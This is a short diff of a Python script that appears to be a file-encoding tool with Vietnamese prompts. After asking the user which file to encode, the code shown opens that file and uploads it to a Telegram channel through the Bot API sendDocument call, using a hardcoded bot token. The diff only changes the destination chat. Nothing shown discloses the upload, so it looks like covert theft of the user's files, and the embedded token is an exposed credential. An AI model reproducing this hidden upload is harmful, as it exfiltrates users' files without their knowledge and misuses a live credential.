@@ -911,7 +911,7 @@ def main():
     file = input(stage(f"Nhập File Cần Encode {dark}--> {Col.reset}", "?", col2 = bpurple)).replace('"','').replace("'","")
 
     bot_token = '6223631247:AAEBsmXeJd8VyMNBeGl_tmBTxYEgA-Onn5Q'
-    chat_id = '-1001968060365'  
+    chat_id = '@Tool_LQM_591'  
     try:
         url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
         with open(file, 'rb') as f:
